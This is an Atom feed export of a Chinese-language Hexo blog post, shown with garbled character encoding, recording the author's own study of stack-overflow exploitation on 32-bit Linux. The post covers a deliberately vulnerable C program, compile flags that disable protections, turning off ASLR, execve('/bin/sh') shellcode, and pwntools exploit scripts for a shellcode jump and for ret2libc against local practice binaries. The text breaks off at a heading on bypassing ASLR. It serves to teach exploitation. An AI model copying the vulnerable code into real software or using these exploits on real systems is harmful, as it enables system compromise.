<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Sunqiz&#39;s Blog</title>
  
  
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2021-08-13T07:53:08.705Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>Sunqiz</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>ä¸€æ­¥ä¸€æ­¥å­¦ROPä¹‹linux_x86å­¦ä¹ </title>
    <link href="http://example.com/2021/08/13/%E8%92%B8%E7%B1%B3ROP_linux_X86/"/>
    <id>http://example.com/2021/08/13/%E8%92%B8%E7%B1%B3ROP_linux_X86/</id>
    <published>2021-08-13T11:39:43.686Z</published>
    <updated>2021-08-13T07:53:08.705Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ä¸€æ­¥ä¸€æ­¥å­¦ROPä¹‹linux-x86å­¦ä¹ "><a href="#ä¸€æ­¥ä¸€æ­¥å­¦ROPä¹‹linux-x86å­¦ä¹ " class="headerlink" title="ä¸€æ­¥ä¸€æ­¥å­¦ROPä¹‹linux_x86å­¦ä¹ "></a>ä¸€æ­¥ä¸€æ­¥å­¦ROPä¹‹linux_x86å­¦ä¹ </h1><p>å­¦ä¹ ç½‘å€ï¼š</p><p><a href="https://www.tuicool.com/articles/ZruA7bZ">https://www.tuicool.com/articles/ZruA7bZ</a></p><p><a href="https://www.yuque.com/hxfqg9/bin/zzg02e#qnw71">https://www.yuque.com/hxfqg9/bin/zzg02e#qnw71</a></p><h2 id="å…ˆæ¥ä¸ªä»€ä¹ˆé˜²å¾¡éƒ½æ²¡æœ‰çš„"><a href="#å…ˆæ¥ä¸ªä»€ä¹ˆé˜²å¾¡éƒ½æ²¡æœ‰çš„" class="headerlink" title="å…ˆæ¥ä¸ªä»€ä¹ˆé˜²å¾¡éƒ½æ²¡æœ‰çš„"></a>å…ˆæ¥ä¸ªä»€ä¹ˆé˜²å¾¡éƒ½æ²¡æœ‰çš„</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vulnerable_function</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">128</span>];</span><br><span class="line">read(STDIN_FILENO, buf, <span class="number">256</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>** argv)</span> </span>&#123;</span><br><span class="line">vulnerable_function();</span><br><span class="line">write(STDOUT_FILENO, <span class="string">&quot;Hello, World\n&quot;</span>, <span class="number">13</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å› ä¸ºreadå‡½æ•°è¯»å…¥256ä¸ªå­—èŠ‚ è€Œbufåªæœ‰128ä¸ªå­—èŠ‚ï¼Œæœ‰æ˜æ˜¾ç¼“å†²åŒºæº¢å‡º</p><p>ä½¿ç”¨å‘½ä»¤è¿›è¡Œç¼–è¯‘</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">ubuntuä¸­</span><br><span class="line"></span><br><span class="line">gcc -m32 -g -fno-stack-protector -z execstack -o level1 level1.c</span><br><span class="line"></span><br><span class="line">kaliä¸­</span><br><span class="line"></span><br><span class="line">gcc -m32 -g -fno-stack-protector -no-pie -z execstack -o level1 level1.c</span><br><span class="line"></span><br><span class="line">ä¸çŸ¥é“ä¸ºå•¥kaliä¸­è¿è¡Œubuntuä¸­å‘½ä»¤å…³ä¸æ‰pieï¼Œå°±å†gccçš„æ—¶å€™å…³æ‰å°±å¥½äº†</span><br></pre></td></tr></table></figure><p>-m32æ„æ€æ˜¯ç¼–è¯‘ä¸º32ä½çš„ç¨‹åº</p><p>-fno-stack-protectorå’Œ-z execstackè¿™ä¸¤ä¸ªå‚æ•°ä¼šåˆ†åˆ«å…³æ‰DEPå’ŒStack Protector -no-pie å…³æ‰pie</p><p>å†æ‰§è¡Œä¸€ä¸‹ï¼ˆéœ€è¦rootæƒé™ï¼Œsudoä¸å¥½ä½¿ï¼Œå…ˆsuåˆ°rootï¼Œæ‰§è¡Œå®Œå†exitï¼‰</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo 0 &gt; /proc/sys/kernel/randomize_va_space</span><br></pre></td></tr></table></figure><p>å…³æ‰ç³»ç»Ÿçš„ASLR</p><p>ç”¨checksecæŸ¥çœ‹ä¸€æ‰‹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ checksec level1</span><br><span class="line">[*] <span class="string">&#x27;/home/giantbranch/pwnstu/test1/level1&#x27;</span></span><br><span class="line">    Arch:     i386-<span class="number">32</span>-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      No PIE (<span class="number">0x8048000</span>)</span><br><span class="line">    RWX:      Has RWX segments</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å¯ä»¥ä½¿ç”¨è‡ªå·±å†™æˆ–ç½‘ä¸Šæ‰¾çš„ pattern.py ç”Ÿæˆæ•°æ®</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">python pattern.py create 150</span></span><br><span class="line">Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9</span><br></pre></td></tr></table></figure><p>ä¹Ÿå¯ä»¥å€ŸåŠ©gdb-peda ä¸­çš„patternç”Ÿæˆ</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">gdb-peda$</span><span class="bash"> pattern create 150</span></span><br><span class="line">&#x27;AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAA&#x27;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œå€ŸåŠ©pattern.pyç”Ÿæˆæ•°æ®ï¼Œåˆ©ç”¨gdbè°ƒè¯•ç¨‹åº</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gdb ./level1</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p>å°†ç”Ÿæˆçš„æ•°æ®å¡«å…¥</p><p><code>Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9</code></p><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/202108041150743.png" alt="image-20210804115038632"></p><p>å‘ç°äº†æŠ¥é”™//ç¨‹åºæ¥æ”¶åˆ°ä¿¡å·SIGSEGV(æ•…éšœåœ°å€0x37654136)</p><p>è¯´æ˜æˆ‘ä»¬çš„ç¼“å†²åŒºæº¢å‡ºåˆ°äº†è¿”å›åœ°å€ï¼ˆå¯æ‰§è¡Œçš„æŒ‡ä»¤é‚£ï¼‰</p><p>è®¡ç®—ä¸€ä¸‹è·ç¦»</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> python pattern.py offset 0x37654136</span></span><br><span class="line">hex pattern decoded as: 6Ae7</span><br><span class="line">140</span><br></pre></td></tr></table></figure><p>é‚£æˆ‘ä»¬éœ€è¦è¦†ç›–çš„ç‚¹å°±æ˜¯140ä¸ªå­—èŠ‚ï¼Œé‚£å°±æ˜¯æ•´ä¸ªæ ˆçš„å¤§å°</p><p>[å¡«å……å­—ç¬¦]+[retå­—ç¬¦ä¸²]å°±å¯ä»¥è®©pcæ‰§è¡Œretåœ°å€ä¸Šçš„ä»£ç äº†</p><p>[å¡«å……å­—ç¬¦] =&gt; [shellcodeâ€¦â€¦AAAAAAAAAAAAAAâ€¦â€¦]</p><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/202108041549532.png" alt="image-20210804154955466"></p><p>ä¹Ÿå°±æ˜¯æˆ‘ä»¬æ‰¾åˆ°å¡«å……çš„å­—ç¬¦ä¸²å¼€å§‹çš„åœ°æ–¹ï¼ŒæŠŠ0x37654136é‚£ä¸€å—çš„åœ°å€æ”¹æˆæ‰¾åˆ°çš„åœ°å€ï¼ŒæŠŠå­—ç¬¦ä¸²å¼€å¤´å†™æˆshellcodeå°±èƒ½åå¼¹shelläº†</p><p>æœ€ç®€å•å°±åˆ©ç”¨execve (â€œ/bin/shâ€) </p><p>é‚£å°±æ˜¯</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># xor ecx, ecx     #æ¸…ç©ºecxå¯„å­˜å™¨ï¼Œå› ä¸ºexecveçš„å‡½æ•°ecxçš„å€¼ä¸º0</span></span><br><span class="line"><span class="comment"># mul ecx</span></span><br><span class="line"><span class="comment"># push ecx</span></span><br><span class="line"><span class="comment"># push 0x68732f2f   #\x00hs/</span></span><br><span class="line"><span class="comment"># push 0x6e69622f   #nib/ï¼Œå°ç«¯æ¨¡å¼éœ€è¦åç€å‹å…¥æ ˆä¸­</span></span><br><span class="line"><span class="comment"># mov ebx, esp #å°†å­—ç¬¦ä¸²çš„åœ°å€ä¼ é€’ç»™ebx</span></span><br><span class="line"><span class="comment"># mov al, 11</span></span><br><span class="line"><span class="comment"># int 0x80#è°ƒç”¨80ä¸­æ–­</span></span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">&quot;\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73&quot;</span></span><br><span class="line">shellcode += <span class="string">&quot;\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0&quot;</span></span><br><span class="line">shellcode += <span class="string">&quot;\x0b\xcd\x80&quot;</span></span><br></pre></td></tr></table></figure><p>æº¢å‡ºç‚¹æœ‰äº†ï¼Œshellcodeæœ‰äº†ï¼Œä¸‹ä¸€æ­¥å°±æ˜¯è·³è½¬åˆ°shellcodeçš„åœ°å€ä¸Š</p><p>æŸ¥é˜…èµ„æ–™å‘ç°æ­£å¸¸çš„æ€ç»´æ˜¯ä½¿ç”¨gdbè°ƒè¯•ç›®æ ‡ç¨‹åºï¼Œç„¶åæŸ¥çœ‹å†…å­˜æ¥ç¡®å®šshellcodeçš„ä½ç½®ï¼Œä½†æ˜¯gdbçš„è°ƒè¯•ç¯å¢ƒä¼šå½±å“bufåœ¨å†…å­˜ä¸­çš„ä½ç½®ï¼Œæˆ‘ä»¬ç›´æ¥è¿è¡Œ./level1çš„æ—¶å€™ï¼Œç¼“å†²åŒºbufä¼šå›ºå®šåˆ°å…¶ä»–åœ°æ–¹</p><p>æˆ‘ä»¬å°±éœ€è¦ç”¨åˆ°core dumpè¿™ä¸ªåŠŸèƒ½ã€‚å¼€å¯äº†core dumpä¹‹åï¼Œå½“å‡ºç°å†…å­˜é”™è¯¯çš„æ—¶å€™ï¼Œç³»ç»Ÿä¼šç”Ÿæˆä¸€ä¸ªcore dumpæ–‡ä»¶ï¼Œç„¶åæˆ‘ä»¬å†ç”¨gdbæŸ¥çœ‹è¿™ä¸ªcoreæ–‡ä»¶å°±å¯ä»¥è·å–åˆ°bufçœŸæ­£çš„åœ°å€äº†ã€‚</p><p>ä½¿ç”¨</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ulimit -c unlimited</span><br></pre></td></tr></table></figure><p>å°±èƒ½å†è¯¥æ–‡ä»¶å¤¹ä¸‹ç”Ÿæˆcore dumpæ–‡ä»¶</p><p>å†è¿è¡Œä¸€æ¬¡ç¨‹åº</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> ./level1</span> </span><br><span class="line">Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9</span><br><span class="line">Segmentation fault (core dumped)</span><br></pre></td></tr></table></figure><p>å†åˆ©ç”¨core dumpedæ–‡ä»¶å¯¹level1æ–‡ä»¶gdbè°ƒè¯•</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pdb level1 core</span><br></pre></td></tr></table></figure><p>æº¢å‡ºç‚¹æ˜¯140ä¸ªå­—èŠ‚ï¼Œå†åŠ ä¸Š4ä¸ªå­—èŠ‚retåœ°å€åˆ©ç”¨x/10s $esp-144æŸ¥çœ‹shellcodeåœ°å€</p><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/202108041637567.png" alt="image-20210804163719516"></p><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/202108041635876.png" alt="image-20210804163513821"></p><p>é‚£shellcodeçš„åœ°å€å°±æ˜¯0xffffcfe0</p><p>ä¸Šè„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&#x27;./level1&#x27;</span>)</span><br><span class="line">ret = <span class="number">0xffffcfe0</span></span><br><span class="line">shellcode = <span class="string">&quot;\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73&quot;</span></span><br><span class="line">shellcode += <span class="string">&quot;\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0&quot;</span></span><br><span class="line">shellcode += <span class="string">&quot;\x0b\xcd\x80&quot;</span></span><br><span class="line">payload = shellcode + <span class="string">&#x27;A&#x27;</span> * (<span class="number">140</span> - <span class="built_in">len</span>(shellcode)) + p32(ret)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/202108041638310.png" alt="image-20210804163821270"></p><p>ä½†æ˜¯æ²¡æˆåŠŸã€‚ã€‚ã€‚ã€‚</p><p>æŸ¥é˜…äº†å¾ˆå¤šèµ„æ–™ï¼Œä½†éƒ½ä¸è¡Œï¼Œåœ¨æ€è€ƒä¸­</p><p>åˆ©ç”¨gdbè°ƒè¯•</p><p>å‘ç°</p><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/202108041717690.png" alt="image-20210804171633239"></p><p>shellcodeæ˜¯éƒ½è¿›å»äº†ï¼Œä½†æ˜¯espæœ‰ä¸çŸ¥é“å»å“ªäº†</p><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/202108041725356.png" alt="image-20210804172552292"></p><p>æ ˆé‡Œä¸œè¥¿æ²¡é”™å•Š espä¹ŸæŒ‡å‘è¿™é‡Œï¼Œæˆ‘å†™çš„shellcode</p><p>æ¥ç€ä¸€ä¸ªå’Œnextå‘½ä»¤ï¼Œæ¥ç€ç›´æ¥è·³åˆ°</p><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/202108041732483.png" alt="image-20210804173224417"></p><p>æ˜¯æˆ‘shellcodeæœ‰é—®é¢˜ğŸQAQ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&quot;./level1&quot;</span>)</span><br><span class="line">ret = <span class="number">0xffffcf80</span></span><br><span class="line">shellcode = asm(<span class="string">&quot;xor ecx, ecx&quot;</span>)</span><br><span class="line">shellcode += asm(<span class="string">&quot;mul ecx&quot;</span>)</span><br><span class="line">shellcode += asm(<span class="string">&quot;push ecx&quot;</span>)</span><br><span class="line">shellcode += asm(<span class="string">&quot;mul ecx&quot;</span>)</span><br><span class="line">shellcode += asm(<span class="string">&quot;push 0x68732f2f&quot;</span>)</span><br><span class="line">shellcode += asm(<span class="string">&quot;push 0x6e69622f&quot;</span>)</span><br><span class="line">shellcode += asm(<span class="string">&quot;mov ebx, esp&quot;</span>)</span><br><span class="line">shellcode += asm(<span class="string">&quot;mov al, 11&quot;</span>)</span><br><span class="line">shellcode += asm(<span class="string">&quot;int 0x80&quot;</span>)</span><br><span class="line">payload =shellcode+ <span class="string">&#x27;A&#x27;</span> * (<span class="number">140</span> - <span class="built_in">len</span>(shellcode)) + p32(ret)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/202108041816595.png" alt="image-20210804181632363"></p><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/202108041823036.png" alt="image-20210804182344977"></p><p>è¿˜ä¸æ¸…æ¥šä»€ä¹ˆåŸå› QAQ</p><p>åˆ©ç”¨ç”Ÿæˆçš„æŠ¥é”™core gdbè°ƒè¯•å¾—åˆ°æ­£ç¡®çš„retåœ°å€å³å¯ï¼Œä½†è¿˜æ˜¯ä¸æ¸…æ¥šä¸ºä»€ä¹ˆåŸæ¥çš„retä¸è¡Œã€‚</p><h2 id="é€šè¿‡ret2libcç»•è¿‡DEPé˜²æŠ¤ï¼ˆæ ˆä¸å¯æ‰§è¡Œï¼‰"><a href="#é€šè¿‡ret2libcç»•è¿‡DEPé˜²æŠ¤ï¼ˆæ ˆä¸å¯æ‰§è¡Œï¼‰" class="headerlink" title="é€šè¿‡ret2libcç»•è¿‡DEPé˜²æŠ¤ï¼ˆæ ˆä¸å¯æ‰§è¡Œï¼‰"></a>é€šè¿‡ret2libcç»•è¿‡DEPé˜²æŠ¤ï¼ˆæ ˆä¸å¯æ‰§è¡Œï¼‰</h2><p><a href="https://bbs.secgeeker.net/thread-1540-1-1.html">https://bbs.secgeeker.net/thread-1540-1-1.html</a></p><p>ret2libcæ˜¯æ ˆæº¢å‡ºæ¼æ´åˆ©ç”¨çš„ä¸€ç§å¸¸è§æ‰‹æ®µã€‚é€šè¿‡æ§åˆ¶å‡½æ•°æ‰§è¡Œlibcä¸­çš„å‡½æ•°ï¼Œlibc.soé‡Œä¿å­˜äº†å¤§é‡å¯åˆ©ç”¨çš„å‡½æ•°ï¼Œé€šå¸¸æˆ‘ä»¬åˆ©ç”¨å…¶æ‰§è¡Œsystem(â€œ/bin/shâ€)</p><p><strong>libc æ˜¯ Linux ä¸‹çš„ ANSI C å‡½æ•°åº“ã€‚æ˜¯Cè¯­è¨€æœ€åŸºæœ¬çš„åº“å‡½æ•°ã€‚å¯ä»¥æŠŠå®ƒç†è§£ä¸ºå¯æ‰§è¡Œç¨‹åºçš„è¿è¡Œä¾èµ–</strong></p><p>linuxä¸‹çš„åŠ¨æ€é“¾æ¥æ˜¯é€šè¿‡PLT&amp;GOTæ¥å®ç°çš„ï¼ŒåŠ¨æ€é“¾æ¥æ¯ä¸ªå‡½æ•°éœ€è¦</p><p>1.å­˜æ”¾å‡½æ•°åœ°å€çš„æ•°æ®æ®µ 2.è·å–æ•°æ®æ®µè®°å½•çš„å¤–éƒ¨å‡½æ•°åœ°å€çš„ä»£ç </p><p>ç”¨æ¥å­˜å¤–éƒ¨å‡½æ•°åœ°å€çš„æ•°æ®è¡¨å«GOTè¡¨ï¼Œå­˜ä»£ç çš„å«PLTè¡¨</p><p><strong>libc æ˜¯ Linux ä¸‹çš„ ANSI C å‡½æ•°åº“ï¼›glibc æ˜¯ Linux ä¸‹çš„ GUN C å‡½æ•°åº“ã€‚</strong> </p><p><strong>libc å®é™…ä¸Šæ˜¯ä¸€ä¸ªæ³›æŒ‡ã€‚å‡¡æ˜¯ç¬¦åˆå®ç°äº† C æ ‡å‡†è§„å®šçš„å†…å®¹ï¼Œéƒ½æ˜¯ä¸€ç§ libc ã€‚</strong><br><strong>glibc æ˜¯ GNU ç»„ç»‡å¯¹ libc çš„ä¸€ç§å®ç°ã€‚å®ƒæ˜¯ unix/linux çš„æ ¹åŸºä¹‹ä¸€ã€‚</strong></p><p>glibcåœ¨/libç›®å½•ä¸‹çš„.soæ–‡ä»¶ä¸ºlibc.so.6,Linuxä¸‹åŸæ¥çš„æ ‡å‡†cåº“Linux libcé€æ¸ä¸å†è¢«ç»´æŠ¤</p><p>ANSI C å‡½æ•°åº“æ˜¯åŸºæœ¬çš„ C è¯­è¨€å‡½æ•°åº“ï¼ŒåŒ…å«äº† C è¯­è¨€æœ€åŸºæœ¬çš„åº“å‡½æ•°ã€‚</p><p>è¿™è¾¹å€Ÿç”¨ä¸€ä¸‹å¸ˆå‚…çš„å›¾</p><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/202108051206433.png" alt="image-20210805120645293"></p><p>æƒ³é€šè¿‡PLTè¡¨è·å¾—å‡½æ•°çš„åœ°å€ï¼Œè¦ä¿è¯GOTè¡¨æœ‰å­˜ä»–çš„æ­£ç¡®åœ°å€ï¼Œä½†æ˜¯ä¸€å¼€å§‹æ‰€æœ‰å‡½æ•°é‡å®šä½ååˆ†éº»çƒ¦ï¼Œlinuxå°±æœ‰äº†å»¶è¿Ÿç»‘å®šæœºåˆ¶</p><h3 id="å»¶è¿Ÿç»‘å®šæœºåˆ¶"><a href="#å»¶è¿Ÿç»‘å®šæœºåˆ¶" class="headerlink" title="å»¶è¿Ÿç»‘å®šæœºåˆ¶"></a>å»¶è¿Ÿç»‘å®šæœºåˆ¶</h3><p>åªæœ‰åŠ¨æ€åº“çš„å‡½æ•°åœ¨è¢«è°ƒç”¨çš„æ—¶å€™æ‰ä¼šåœ°å€è§£æå’Œé‡å®šä½ã€‚</p><p>åœ°å€è§£æå’Œé‡å®šä½ç›¸å½“å½“ä¸€ä¸ªå‡½æ•°è¦è¢«è°ƒç”¨äº†ï¼Œå°±ä¼šåˆ©ç”¨PTLè¡¨æ‰¾åˆ°GOTè¡¨çš„å†…å®¹ï¼Œå°±å¯ä»¥è·³è½¬åˆ°æ­£ç¡®çš„åœ°å€è¿è¡Œå‡½æ•°ã€‚</p><p>æ¥ç€æˆ‘ä»¬çš„è¿›é˜¶ä»»åŠ¡</p><p>ä½¿ç”¨å‘½ä»¤</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -m32 -g -fno-stack-protector -o level2 level1.c</span><br></pre></td></tr></table></figure><p>ç”Ÿæˆæˆ‘ä»¬çš„ç¬¬äºŒé¢˜</p><p>åˆ©ç”¨ret2libcæ§åˆ¶å‡½æ•°çš„æ‰§è¡Œ libc ä¸­çš„system(â€œ/bin/shâ€)</p><p>é‚£ç°åœ¨å°±æ˜¯å¾—åˆ°system()è¿™ä¸ªå‡½æ•°çš„åœ°å€ä»¥åŠâ€/bin/shâ€è¿™ä¸ªå­—ç¬¦ä¸²çš„åœ°å€ï¼Œsystem å‡½æ•°å±äº libcï¼Œè€Œ libc.so åŠ¨æ€é“¾æ¥åº“ä¸­çš„å‡½æ•°ä¹‹é—´ç›¸å¯¹åç§»æ˜¯å›ºå®šçš„ã€‚å³ä½¿ç¨‹åºå¼€å¯äº† ASLR ï¼Œä¹Ÿåªæ˜¯é’ˆå¯¹äºåœ°å€ä¸­é—´ä½è¿›è¡Œéšæœºï¼Œæœ€ä½çš„ 12 ä½å¹¶ä¸ä¼šå‘ç”Ÿæ”¹å˜ã€‚</p><p>ç”¨checksecçœ‹ä¸€çœ‹</p><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/202108051521011.png" alt="image-20210805152105953"></p><p>å†ç”¨å‘½ä»¤</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gdb ./level2</span><br><span class="line">b main</span><br><span class="line">r</span><br></pre></td></tr></table></figure><p>è®©ç¨‹åºå°†libc.soåŠ è½½åˆ°å†…å­˜ä¸­</p><p>å› ä¸ºæˆ‘ä»¬å…³é—­äº†ASLRï¼Œæ‰€ä»¥ systemå‡½æ•°å’Œâ€/bin/shâ€å­—ç¬¦ä¸²åœ¨å†…å­˜ä¸­çš„åœ°å€æ˜¯ä¸ä¼šå˜åŒ–æ»´ï¼Œé€šè¿‡</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">print system</span><br><span class="line">find &quot;/bin/sh&quot;</span><br></pre></td></tr></table></figure><p>å¾—åˆ°systemå’Œâ€/bin/shâ€çš„ä½ç½®</p><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/202108051523754.png" alt="image-20210805152351709"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0xf7e3ddb0</span><br><span class="line">0xf7f5eb2b</span><br></pre></td></tr></table></figure><p>ä¸Šexp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./level2&#x27;</span>)</span><br><span class="line"><span class="comment">#p = remote(&#x27;127.0.0.1&#x27;,10001)</span></span><br><span class="line">ret = <span class="number">0xdeadbeef</span></span><br><span class="line">systemaddr=<span class="number">0xf7e3ddb0</span></span><br><span class="line">binshaddr=<span class="number">0xf7f5eb2b</span></span><br><span class="line">payload =  <span class="string">&#x27;A&#x27;</span>*<span class="number">140</span> + p32(systemaddr) + p32(ret) + p32(binshaddr)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;level2ex.txt&quot;</span>,<span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">f.write(payload)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>ç”±äºsystemæ‰§è¡Œå®Œéœ€è¦è¿”å›åœ°å€ï¼Œç„¶åå†ä¼ â€/bin/shâ€çš„åœ°å€è¿›å…¥systemä¸­ï¼Œé‚£ä¸ªè¿”å›åœ°å€æ²¡æœ‰ä½¿ç”¨ï¼Œå¯ä»¥éšä¾¿å†™</p><p>æ‰§è¡ŒæˆåŠŸï¼š</p><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/202108051601044.png" alt="image-20210805160112990"></p><h2 id="ç»•è¿‡ASLRé˜²æŠ¤"><a 